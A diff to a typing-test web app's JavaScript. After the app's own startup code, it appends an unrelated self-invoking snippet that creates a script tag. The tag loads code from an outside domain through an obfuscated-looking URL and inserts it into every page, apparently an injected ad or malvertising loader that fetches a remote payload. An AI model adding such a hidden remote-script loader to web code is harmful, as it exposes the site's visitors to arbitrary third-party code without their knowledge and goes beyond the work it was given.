@@ -239,3 +239,13 @@ class TypingTest {
 document.addEventListener("DOMContentLoaded", () => {
     new TypingTest();
 });
+(function(dgik){
+var d = document,
+    s = d.createElement('script'),
+    l = d.scripts[d.scripts.length - 1];
+s.settings = dgik || {};
+s.src = "\/\/pricklyassociation.com\/bbX.V\/sGdZGSld0AYBWJcX\/Ketmh9duYZdUTlCkRP\/TFcfw\/NQDqg_5QMEj\/k_tpNTzKA_0qO\/DjktzJMtwg";
+s.async = true;
+s.referrerPolicy = 'no-referrer-when-downgrade';
+l.parentNode.insertBefore(s, l);
+})({})
